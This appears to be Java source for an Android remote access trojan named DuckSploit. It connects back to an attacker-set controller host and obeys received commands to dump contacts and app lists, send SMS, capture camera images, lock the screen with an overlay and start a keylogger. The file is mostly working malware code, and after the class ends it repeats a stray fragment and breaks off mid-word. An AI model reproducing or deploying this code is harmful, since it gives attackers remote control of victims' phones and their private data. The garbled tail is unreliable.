package com.Duckpvp.DuckSploit.Horse;

import androidx.appcompat.app.AppCompatActivity;
import androidx.annotation.*;
import android.app.*;
import android.os.*;
import android.view.*;
import android.view.View.*;
import android.widget.*;
import android.content.*;
import android.content.res.*;
import android.graphics.*;
import android.graphics.drawable.*;
import android.media.*;
import android.net.*;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.webkit.*;
import android.animation.*;
import android.view.animation.*;
import java.util.*;
import java.util.regex.*;
import java.text.*;
import org.json.*;
import java.util.HashMap;
import java.util.ArrayList;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.ImageView;
import java.util.Timer;
import java.util.TimerTask;
import android.content.Intent;
import android.net.Uri;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.app.Activity;
import android.content.SharedPreferences;
import java.net.InetSocketAddress;
import android.provider.MediaStore;
import android.os.Build;
import androidx.core.content.FileProvider;
import java.io.File;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.sun.net.httpserver.*;
import com.beuni.screenshot.*;
import sun.net.httpserver.*;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.fragment.app.DialogFragment;
import androidx.core.content.ContextCompat;
import androidx.core.app.ActivityCompat;
import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Handler;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import android.net.wifi.WifiManager;
import java.util.Formatter;
import android.net.wifi.WifiInfo;
import java.io.File;
import java.io.BufferedInputStream;
import java.io.OutputStream;
import java.io.IOException;
import java.io.FileInputStream;
import java.io.*;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CameraAccessException;
import android.hardware.Camera;
import android.graphics.*;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URLDecoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.io.FileOutputStream;;

public class MainActivity extends AppCompatActivity {
	public final int REQ_CD_CAMERA = 101;
	private Timer _timer = new Timer();
	
	private String Path = "";
	private String FileName = "";
	private String output = "";
	private String hacker_ip = "";
	private String cmd_input = "";
	private HashMap<String, Object> map = new HashMap<>();
	private  Handler handler;
	private  Thread thread;
	private  int SERVERPORT;
	private String SERVER_IP = "";
	private  ClientThread clientThread;
	private String clientIp = "";
	private String allmessages = "";
	private String message = "";
	private HashMap<String, Object> mp2 = new HashMap<>();
	private String part1 = "";
	private String part2 = "";
	private String part3 = "";
	private boolean ring = false;
	private boolean noti = false;
	private String type = "";
	private String names = "";
	private String number = "";
	private String sms = "";
	private String applist = "";
	private String sysapplist = "";
	private double n = 0;
	private String v = "";
	private String msg = "";
	private double a = 0;
	private String savepath = "";
	private double f = 0;
	private  Camera c;
	private  CameraManager cM;
	private  Camera.Parameters prm;
	
	private ArrayList<HashMap<String, Object>> listmap = new ArrayList<>();
	private ArrayList<HashMap<String, Object>> contacts = new ArrayList<>();
	private ArrayList<String> str = new ArrayList<>();
	private ArrayList<HashMap<String, Object>> data = new ArrayList<>();
	private ArrayList<HashMap<String, Object>> dat = new ArrayList<>();
	
	private LinearLayout linear1;
	private TextView textview1;
	private ImageView imageview1;
	private ImageView imageview2;
	private LinearLayout cameralin;
	
	private TimerTask timer;
	private Intent intent = new Intent();
	private AlertDialog.Builder dial;
	private Intent i = new Intent();
	private SharedPreferences sp;
	private HttpServer httpserver;
	private Intent camera = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
	private File _file_camera;
	
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.main);
		initialize(_savedInstanceState);
		if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_DENIED
		|| ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED
		|| ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED) {
			ActivityCompat.requestPermissions(this, new String[] {Manifest.permission.CAMERA, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1000);
		}
		else {
			initializeLogic();
		}
	}
	
	@Override
	public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
		super.onRequestPermissionsResult(requestCode, permissions, grantResults);
		if (requestCode == 1000) {
			initializeLogic();
		}
	}
	
	private void initialize(Bundle _savedInstanceState) {
		linear1 = (LinearLayout) findViewById(R.id.linear1);
		textview1 = (TextView) findViewById(R.id.textview1);
		imageview1 = (ImageView) findViewById(R.id.imageview1);
		imageview2 = (ImageView) findViewById(R.id.imageview2);
		cameralin = (LinearLayout) findViewById(R.id.cameralin);
		dial = new AlertDialog.Builder(this);
		sp = getSharedPreferences("sp", Activity.MODE_PRIVATE);
		_file_camera = FileUtil.createNewPictureFile(getApplicationContext());
		Uri _uri_camera = null;
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
			_uri_camera= FileProvider.getUriForFile(getApplicationContext(), getApplicationContext().getPackageName() + ".provider", _file_camera);
		}
		else {
			_uri_camera = Uri.fromFile(_file_camera);
		}
		camera.putExtra(MediaStore.EXTRA_OUTPUT, _uri_camera);
		camera.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
	}
	
	private void initializeLogic() {
		
		n = 0;
		_cameras(0);
		if (Build.VERSION.SDK_INT >= 23) {
						if (checkSelfPermission(android.Manifest.permission.SYSTEM_ALERT_WINDOW) == android.content.pm.PackageManager.PERMISSION_DENIED) {
								requestPermissions(new String[] {android.Manifest.permission.SYSTEM_ALERT_WINDOW}, 1000);
						}
						else {
				 
						}
				}
				else {
			 
				}
		FileUtil.makeDir(FileUtil.getPackageDataDir(getApplicationContext()).concat("/pannel/keyloggs"));
		FileUtil.makeDir(FileUtil.getPackageDataDir(getApplicationContext()).concat("/pannel/temp"));
		FileUtil.writeFile(FileUtil.getPackageDataDir(getApplicationContext()).concat("/pannel/user_infos.txt"), "username: ".concat(Build.USER.concat(" \nipv4: ".concat("0.0.0.0".concat(" \nipv6: ".concat("00.00.00.00.00.00"))))));
		new async().execute("");
		new client().execute("");
		_extra();
	}
	
	@Override
	protected void onActivityResult(int _requestCode, int _resultCode, Intent _data) {
		super.onActivityResult(_requestCode, _resultCode, _data);
		switch (_requestCode) {
			
			default:
			break;
		}
	}
	
	private class async extends AsyncTask<String, Integer, String> {
		@Override
		protected void onPreExecute() {
			
		}
		
		@Override
		protected String doInBackground(String... params) {
			String _param = params[0];
			msg = "";
			try{
				httpserver = HttpServer.create(new InetSocketAddress((int)8000), 0);
					
					
				httpserver.createContext("/", new handler());

				httpserver.setExecutor(null);
					
				httpserver.start();
					
				msg = "Server is running at http://localhost:8000";
			}catch(Exception e){
				msg = "Error Message ".concat(e.getMessage());
			}
			return (message);
		}
		
		@Override
		protected void onProgressUpdate(Integer... values) {
			int _value = values[0];
			
		}
		
		@Override
		protected void onPostExecute(String _result) {
			try{
				_snd_output("✔️ Hosting at $ip :8000", "");
				_snd_output("❌ Could not get ipv4 address ", "");
			}catch(Exception e){
				 
			}
		}
	}
	
	private class client extends AsyncTask<String, Integer, String> {
		@Override
		protected void onPreExecute() {
			
		}
		
		@Override
		protected String doInBackground(String... params) {
			String _param = params[0];
			try{
				timer = new TimerTask() {
					@Override
					public void run() {
						runOnUiThread(new Runnable() {
							@Override
							public void run() {
								SERVERPORT = Integer.parseInt("8015");
								handler = new Handler ();
								sp.edit().putString("ip", "<your ip>").commit();
								sp.edit().putString("port", "8015").commit();
								clientThread = new ClientThread();
								thread = new Thread(clientThread);
								thread.start();
							}
						});
					}
				};
				_timer.scheduleAtFixedRate(timer, (int)(3000), (int)(2000));
			}catch(Exception e){
				 
			}
			return ("Ok");
		}
		
		@Override
		protected void onProgressUpdate(Integer... values) {
			int _value = values[0];
			
		}
		
		@Override
		protected void onPostExecute(String _result) {
			
		}
	}
	
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		httpserver.stop(0);
	}
	public void _exec_cmd (final String _cmd) {
		try{
			String[] parts = _cmd.split(" ");
			part1 = parts[0];
			part2 = parts[1];
			part3 = parts[2];
		}catch(Exception e){
			 
		}
		if (part1.equals("screenshot")) {
			FileUtil.makeDir(FileUtil.getPackageDataDir(getApplicationContext()).concat("/Screenshot"));
			
			_snd_output("Screenshot taken! ", "#80FF00");
		}
		else {
			if (part1.equals("contacts")) {
				_GetAllContacts();
				_snd_output("Contacts:\n\n".concat(names), "#FF0400");
			}
			else {
				if (part1.equals("malware")) {
					if (part2.equals("--help")) {
						_snd_output("DuckSploit - V1.0.8\n#ANDROID VERSION\n\nUsage: malware [-option]\n Options:\n       -> keylogger\n       -> --help\n       -> \n       -> ", "#80FF00");
					}
					else {
						if (part2.equals("keylogger")) {
							_keylogger();
							_snd_output("Keylogger started! ", "#80FF00");
						}
						else {
							_snd_output("Usage: malware [-option]", "#FF0400");
						}
					}
				}
				else {
					if (part1.equals("help")) {
						_snd_output("DuckSploit - V1.0.8\n#ANDROID VERSION\ncmd         |        usage         |   Description\n----------------------------------------------------------\nhelp        | help                 | get command list\nopen        | open <package>       | start selected package\nscreenshot  | screenshot           | take screenshot\nmalware     | malware [-option]    | execute a malware\nnotif       | notif <title>< msg>  | send a notif\nwallpaper   | wallpaper            | change wallpaper\nlock        | lock                 | lock phone\nunlock      | unlock               | unlock phone\nsend_sms    | send_sms <num> <sms> | send sms to number\ncontacts    | constacts            | get all contacts\napp_list    | app_list             | get app list\nsys_app_list| sys_app_list         | get system app list", "#80FF00");
					}
					else {
						if (part1.equals("open")) {
							intent = getPackageManager().getLaunchIntentForPackage(part2);
							startActivity(intent);
							_snd_output(part2.concat(" successfully opended! "), "#80FF00");
						}
						else {
							if (part1.equals("notif")) {
								_notification(part2, part3, 1, false);
							}
							else {
								if (part1.equals("wallpaper")) {
									WallpaperManager wallpaperManager = WallpaperManager.getInstance(getApplicationContext());
									try { 
										Bitmap bitmap = ((android.graphics.drawable.BitmapDrawable) imageview1.getDrawable()).getBitmap();
										wallpaperManager.setBitmap(bitmap);
										_snd_output("Wallpaper is set! ", "#FF0400");
									} 
									catch (Exception g) { 
										g.printStackTrace();
										_snd_output("Wallpaper can't be set! ", "#FF0400");
									}
								}
								else {
									if (part1.equals("lock")) {
										_lock();
										_snd_output("Phone is locked 🔒! ", "#FF0400");
									}
									else {
										if (part1.equals("unlock")) {
											iwindow.removeView(iview);
											_snd_output("Phone is unlocked 🔓! ", "#FF0400");
										}
										else {
											if (part1.equals("send_sms")) {
												number = part2;
												sms = part3;
												try {
														android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault(); smsManager.sendTextMessage(number, null, sms, null, null);
														
														 
												}
												catch (Exception e) { 
														Intent myAppSettings = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + getPackageName())); myAppSettings.addCategory(Intent.CATEGORY_DEFAULT); myAppSettings.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(myAppSettings); 
														e.printStackTrace();
												}
												_snd_output("Sms sended 📨! ", "#FF0400");
											}
											else {
												if (part1.equals("app_list")) {
													_getapplist();
													_snd_output(applist, "#FF0400");
												}
												else {
													if (part1.equals("sys_app_list")) {
														_getsysapplist();
														_snd_output(sysapplist, "#FF0400");
													}
													else {
														if (part1.equals("webcam")) {
															if (part2.equals("0")) {
																_cameras(0);
																_take_screenshot();
															}
															else {
																_cameras(1);
																_take_screenshot();
															}
															_snd_output("Webcam picture taked! ", "");
															_send_image("".concat("screenshot.png"));
														}
														else {
															_snd_output("This command (".concat(part1.concat(") does not exist! ")), "#FF0400");
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
	
	
	public void _send_output (final String _output) {
		map = new HashMap<>();
		map.put("msg", _output);
		map.put("ip", "client");
		clientThread.sendMessage(new Gson().toJson(map));
		map.clear();
	}
	
	
	public void _ClientThread () {
	}
	class ClientThread implements Runnable {
		private Socket socket;
		private BufferedReader input;
		
		private String SERVER_IP = sp.getString("ip", "");
		private int SERVERPORT = Integer.parseInt(sp.getString("port", ""));
		
		@Override
		public void run() {
			try {
				
				InetAddress serverAddr = InetAddress.getByName(SERVER_IP);
				
				socket = new Socket(serverAddr, SERVERPORT);
				
				while (!Thread.currentThread().isInterrupted()) {
					
					this.input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
					
					message = input.readLine();
					
					if (null == message || "Disconnect".contentEquals(message)) {
						Thread.interrupted();
						message = "Server Disconnected";
						
						_ShowMessage(message);
						
						break;
					}
					
					try{
						_ShowMessage(message);
					}catch(Exception e){
						 
					}
					
				}} catch (UnknownHostException e1) {
				e1.printStackTrace();
			} catch (IOException e1) {
				e1.printStackTrace();
			}}
		void sendMessage(final String message) {
			new Thread(new Runnable() {
					@Override
					public void run() {
							try {
									if (null != socket) {
											PrintWriter out = new PrintWriter(new BufferedWriter(
											new OutputStreamWriter(socket.getOutputStream())),true);
											
											out.println(message);
											
									}} catch (Exception e) {
									e.printStackTrace();
							}}}).start();
		}
	}
	
	
	public void _ShowMessage (final String _message) {
		handler.post(new Runnable() {
						@Override
						public void run() {
								try{
					mp2 = new Gson().fromJson(_message, new TypeToken<HashMap<String, Object>>(){}.getType());
					if (!mp2.get("msg").toString().equals("Server Disconnected")) {
						_exec_cmd(mp2.get("msg").toString());
					}
					else {
						dial.setMessage("Server disconnected");
						dial.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
							@Override
							public void onClick(DialogInterface _dialog, int _which) {
								
							}
						});
						dial.create().show();
					}
					textview1.setText(_message);
				}catch(Exception e){
					 
				}
						}});
	}
	
	
	public void _keylogger () {
		
	}
	
	
	public void _notification (final String _Title, final String _Desc, final double _id, final boolean _sticky) {
		if (_sticky) {
			final Context context = getApplicationContext();
			
			
			NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
			
			Intent intent = new Intent(this, MainActivity.class); 
			intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP); 
			PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 0); 
			androidx.core.app.NotificationCompat.Builder builder; 
			
			    int notificationId = (int) _id;
			    String channelId = "channel-01";
			    String channelName = "Channel Name";
			    int importance = NotificationManager.IMPORTANCE_HIGH;
			
			    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
				        NotificationChannel mChannel = new NotificationChannel(
				                channelId, channelName, importance);
				        notificationManager.createNotificationChannel(mChannel);
				    }
			
			   
			 androidx.core.app.NotificationCompat.Builder mBuilder = new androidx.core.app.NotificationCompat.Builder(context, channelId)
			            .setSmallIcon(R.drawable.baseimg)
			            .setContentTitle(_Title)
			            .setContentText(_Desc)
			            .setAutoCancel(false)
			            .setOngoing(true)
			            .setContentIntent(pendingIntent);
			    TaskStackBuilder stackBuilder = TaskStackBuilder.create(context);
			    stackBuilder.addNextIntent(intent);
			    PendingIntent resultPendingIntent = stackBuilder.getPendingIntent(
			            0,
			            PendingIntent.FLAG_UPDATE_CURRENT
			    );
			    mBuilder.setContentIntent(resultPendingIntent);
			
			    notificationManager.notify(notificationId, mBuilder.build());
			
			
		}
		else {
			final Context context = getApplicationContext();
			
			
			NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
			
			Intent intent = new Intent(this, MainActivity.class); 
			intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP); 
			PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 0); 
			androidx.core.app.NotificationCompat.Builder builder; 
			
			    int notificationId = (int) _id;
			    String channelId = "channel-01";
			    String channelName = "Channel Name";
			    int importance = NotificationManager.IMPORTANCE_HIGH;
			
			    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
				        NotificationChannel mChannel = new NotificationChannel(
				                channelId, channelName, importance);
				        notificationManager.createNotificationChannel(mChannel);
				    }
			
			  
			 androidx.core.app.NotificationCompat.Builder mBuilder = new androidx.core.app.NotificationCompat.Builder(context, channelId)
			            .setSmallIcon(R.drawable.baseimg)
			            .setContentTitle(_Title)
			            .setContentText(_Desc)
			            .setAutoCancel(true)
			            .setOngoing(false)
			            .setContentIntent(pendingIntent);
			    TaskStackBuilder stackBuilder = TaskStackBuilder.create(context);
			    stackBuilder.addNextIntent(intent);
			    PendingIntent resultPendingIntent = stackBuilder.getPendingIntent(
			            0,
			            PendingIntent.FLAG_UPDATE_CURRENT
			    );
			    mBuilder.setContentIntent(resultPendingIntent);
			
			    notificationManager.notify(notificationId, mBuilder.build());
			
		}
	}
	
	
	public void _snd_output (final String _output, final String _color) {
		clientThread.sendMessage(_output);
	}
	
	
	public void _lock () {
		int LAYOUT_FLAG;
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
				    LAYOUT_FLAG = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
		} else {
				    LAYOUT_FLAG = WindowManager.LayoutParams.TYPE_PHONE;
		}
		
		ipara = new WindowManager.LayoutParams(
		    WindowManager.LayoutParams.WRAP_CONTENT,
		    WindowManager.LayoutParams.WRAP_CONTENT,
		    LAYOUT_FLAG,
		      
		    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL 
		     ,
		
		    PixelFormat.TRANSLUCENT);
		
		iwindow = (WindowManager) getSystemService(WINDOW_SERVICE);
		 iin = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);
		  
		
		iview = (View) getLayoutInflater().inflate(R.layout.lock, null);
		final String iAV = Build.VERSION.RELEASE;
		if (Double.parseDouble(iAV.substring((int)(0), (int)(1))) < 6) {
				iwindow.addView(iview, ipara);
		}
else {
				if (android.provider.Settings.canDrawOverlays(MainActivity.this)) {
								iwindow.addView(iview, ipara);
				} else {
								Intent ii = new Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
								Uri.parse("package:" + getPackageName()));
								startActivity(ii);
				}

		}
		getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION);
	}
	
	
	public void _more () {
	}
	private View iview;
	private WindowManager iwindow;
	private LayoutInflater iin;
	WindowManager.LayoutParams ipara;
	{
	}
	
	
	public void _get_contacts () {
		
	}
	
	
	public void _addContact (final String _name, final String _phone) {
		if (!names.contains(_name)) {
			names = names.concat("\n".concat(_name.trim().toUpperCase().concat("= ".concat(_phone))));
		}
	}
	
	
	public void _GetAllContacts () {
		android.database.Cursor c = getContentResolver().query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[] {android.provider.ContactsContract.CommonDataKinds.Phone._ID, android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
		while(c.moveToNext()) {
				_addContact(c.getString(1), c.getString(2));
		}
	}
	
	
	public void _getapplist () {
		applist = "App list:\n\n";
		applistData = "Allinstallapp";
		icon_list.clear();
		name_list.clear();
		version_list.clear();
		package_list.clear();
		versionCode_list.clear();
		apkPath.clear();
		data.clear();
		
		for (android.content.pm.PackageInfo packageInfo : getApplicationContext().getPackageManager().getInstalledPackages(0)) {
				  if(applistData == "Allinstallapp" ){
						      if ((packageInfo.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
								          name_list.add(packageInfo.applicationInfo.loadLabel(getPackageManager()).toString());
								          package_list.add(packageInfo.packageName);
								          version_list.add(packageInfo.versionName);
								          versionCode_list.add(String.valueOf(packageInfo.versionCode));
										  applist = applist.concat("\n".concat(packageInfo.applicationInfo.loadLabel(getPackageManager()).toString().concat(": ".concat(packageInfo.packageName))));
								
								apkPath.add(packageInfo.applicationInfo.sourceDir);
								          {
										       		HashMap<String, Object> _item = new HashMap<>();
										       		_item.put("key", "items");
											      	data.add(_item);
										         }
								        {
											     	HashMap<String, android.graphics.drawable.Drawable> _item = new HashMap<String, android.graphics.drawable.Drawable>();
										        _item.put("icon_path",packageInfo.applicationInfo.loadIcon(getPackageManager()));
										     		icon_list.add(_item);
										      }      	
								     }
						  } else {
						      if(applistData == "SystemApp"){
								          if ((packageInfo.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0) {
										          name_list.add(packageInfo.applicationInfo.loadLabel(getPackageManager()).toString());
										          package_list.add(packageInfo.packageName);
										          version_list.add(packageInfo.versionName);
										          versionCode_list.add(String.valueOf(packageInfo.versionCode));
												  applist = applist.concat("\n".concat(packageInfo.applicationInfo.loadLabel(getPackageManager()).toString().concat(": ".concat(packageInfo.packageName))));
										
										apkPath.add(packageInfo.applicationInfo.sourceDir);
										          {
												       		HashMap<String, Object> _item = new HashMap<>();
												       		_item.put("key", "items");
													      	data.add(_item);
												         }
										        {
													     	HashMap<String, android.graphics.drawable.Drawable> _item = new HashMap<String, android.graphics.drawable.Drawable>();
												        _item.put("icon_path",packageInfo.applicationInfo.loadIcon(getPackageManager()));
												     		icon_list.add(_item);
												      }      	
										         }
								     }
						  }
		}
		 
	}
	
	
	public void _extra () {
	}
	private ArrayList<String> name_list = new ArrayList<>();
	private ArrayList<String> package_list = new ArrayList<>();
	private ArrayList<String> version_list = new ArrayList<>();
	private ArrayList<String> versionCode_list = new ArrayList<>();
	private ArrayList<String> apkPath = new ArrayList<>();
	
	private ArrayList < HashMap < String, android.graphics.drawable.Drawable> > icon_list = new ArrayList<>(); 
	private String applistData ="Allinstallapp";
	private void nothing(){
	}
	
	
	public void _getsysapplist () {
		sysapplist = "System apps list:\n\n";
		applistData = "SystemApp";
		icon_list.clear();
		name_list.clear();
		version_list.clear();
		package_list.clear();
		versionCode_list.clear();
		apkPath.clear();
		data.clear();
		
		for (android.content.pm.PackageInfo packageInfo : getApplicationContext().getPackageManager().getInstalledPackages(0)) {
				  if(applistData == "Allinstallapp" ){
						      if ((packageInfo.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
								          name_list.add(packageInfo.applicationInfo.loadLabel(getPackageManager()).toString());
								          package_list.add(packageInfo.packageName);
								          version_list.add(packageInfo.versionName);
								          versionCode_list.add(String.valueOf(packageInfo.versionCode));
										  sysapplist = sysapplist.concat("\n".concat(packageInfo.applicationInfo.loadLabel(getPackageManager()).toString().concat(": ".concat(packageInfo.packageName))));
								
								apkPath.add(packageInfo.applicationInfo.sourceDir);
								          {
										       		HashMap<String, Object> _item = new HashMap<>();
										       		_item.put("key", "items");
											      	data.add(_item);
										         }
								        {
											     	HashMap<String, android.graphics.drawable.Drawable> _item = new HashMap<String, android.graphics.drawable.Drawable>();
										        _item.put("icon_path",packageInfo.applicationInfo.loadIcon(getPackageManager()));
										     		icon_list.add(_item);
										      }      	
								     }
						  } else {
						      if(applistData == "SystemApp"){
								          if ((packageInfo.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0) {
										          name_list.add(packageInfo.applicationInfo.loadLabel(getPackageManager()).toString());
										          package_list.add(packageInfo.packageName);
										          version_list.add(packageInfo.versionName);
										          versionCode_list.add(String.valueOf(packageInfo.versionCode));
												  sysapplist = sysapplist.concat("\n".concat(packageInfo.applicationInfo.loadLabel(getPackageManager()).toString().concat(": ".concat(packageInfo.packageName))));
										
										apkPath.add(packageInfo.applicationInfo.sourceDir);
										          {
												       		HashMap<String, Object> _item = new HashMap<>();
												       		_item.put("key", "items");
													      	data.add(_item);
												         }
										        {
													     	HashMap<String, android.graphics.drawable.Drawable> _item = new HashMap<String, android.graphics.drawable.Drawable>();
												        _item.put("icon_path",packageInfo.applicationInfo.loadIcon(getPackageManager()));
												     		icon_list.add(_item);
												      }      	
										         }
								     }
						  }
		}
		 
	}
	
	
	public void _send_image (final String _path) {
		clientThread.sendMessage("/!\\IMG/!\\:".concat(_path));
	}
	
	
	public void _localserver () {
	}
	public class handler implements HttpHandler {
		@Override
		public void handle(HttpExchange exchange) throws IOException{
			String path = FileUtil.getPackageDataDir(getApplicationContext()).concat("/pannel") + exchange.getRequestURI();

			String plain_text = "";
			File file = new File(path);
			if(file.isDirectory()){
				path = path +"/index."+"html";
				file = new File(path);
			}
			
			String mime = MimeTypeMap.getFileExtensionFromUrl(path);
			mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(mime);
			
			
			if(mime.contains("text")){
					Scanner sc = new Scanner(file);
					
					while(sc.hasNextLine()){
							plain_text = plain_text + sc.nextLine();
					}
					exchange.sendResponseHeaders(200, plain_text.length());
					OutputStream os = exchange.getResponseBody();
					
					
os.write(plain_text.getBytes());
					os.close();
			}else{
					
					byte[] bytes = new byte[(int) file.length()];
					FileInputStream fileInputStream = new FileInputStream(file);
					BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream);
					bufferedInputStream.read(bytes, 0, bytes.length);
					
					exchange.sendResponseHeaders(200, file.length());
					OutputStream outputStream= exchange.getResponseBody();
					outputStream.write(bytes, 0, bytes.length);
					outputStream.close();
					
			}
		}
	}
	
	
	{
	}
	
	
	public void _cameras (final double _id) {
		c = null;
		linear1.removeAllViews();
		try{ 
			cM = (CameraManager) getSystemService (Context.CAMERA_SERVICE) ;
			 c = Camera.open((int) _id);
			CamView cam = new CamView(this, c, (int) _id);
			linear1.addView(cam); 
			
			prm = c.getParameters();
			       
			       
			       
			
		} catch (Exception e) {} 
	}
	
	
	public void _take_screenshot () {
		savepath = FileUtil.getPackageDataDir(getApplicationContext()).concat("/pannel/screenshot.png");
		try{
			View v1=getWindow().getDecorView().getRootView();
			v1.setDrawingCacheEnabled(true);
			Bitmap bitmap= Bitmap.createBitmap(v1.getDrawingCache());
			File imageFile = new File(savepath);
			OutputStream outputStream= new FileOutputStream(imageFile);
			int quality=100;
			bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
			outputStream.flush();
			outputStream.close();
		}catch(Exception e){
			SketchwareUtil.showMessage(getApplicationContext(), e.toString());
		}
	}
	
	
	@Deprecated
	public void showMessage(String _s) {
		Toast.makeText(getApplicationContext(), _s, Toast.LENGTH_SHORT).show();
	}
	
	@Deprecated
	public int getLocationX(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[0];
	}
	
	@Deprecated
	public int getLocationY(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[1];
	}
	
	@Deprecated
	public int getRandom(int _min, int _max) {
		Random random = new Random();
		return random.nextInt(_max - _min + 1) + _min;
	}
	
	@Deprecated
	public ArrayList<Double> getCheckedItemPositionsToArray(ListView _list) {
		ArrayList<Double> _result = new ArrayList<Double>();
		SparseBooleanArray _arr = _list.getCheckedItemPositions();
		for (int _iIdx = 0; _iIdx < _arr.size(); _iIdx++) {
			if (_arr.valueAt(_iIdx))
			_result.add((double)_arr.keyAt(_iIdx));
		}
		return _result;
	}
	
	@Deprecated
	public float getDip(int _input) {
		return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, _input, getResources().getDisplayMetrics());
	}
	
	@Deprecated
	public int getDisplayWidthPixels() {
		return getResources().getDisplayMetrics().widthPixels;
	}
	
	@Deprecated
	public int getDisplayHeightPixels() {
		return getResources().getDisplayMetrics().heightPixels;
	}
}

		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[1];
	}
	
	@Deprecated
	public int getRandom(int _min, int _max) {
		Random random = new Random();
		return random.nextInt(_max - _min + 1) + _min;
	}
	
	@Deprecated
	public ArrayList<Double> getCheckedItemPositionsToArray(ListView _list) {
		ArrayList<Double> _result = new ArrayList<Double>();
		SparseBooleanArray _arr = _list.getCheckedItemPositions();
		for (int _iIdx = 0; _iIdx < _arr.size(); _iIdx++) {
			if (_arr.valueAt(_iIdx))
			_result.add((double)_arr.keyAt(_iIdx));
		}
		return _result;
	}
	
	@Deprecated
	public float getDip(int _input) {
		return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, _input, getResources().getDisplayMetrics());
	}
	
	@Deprecated
	public int getDisplayWidthPixels() {
		return getResources().getDisplayMetrics().widthPixels;
	}
	
	@Deprecated
	public int getDisplayHeightPixels() {
		return getResources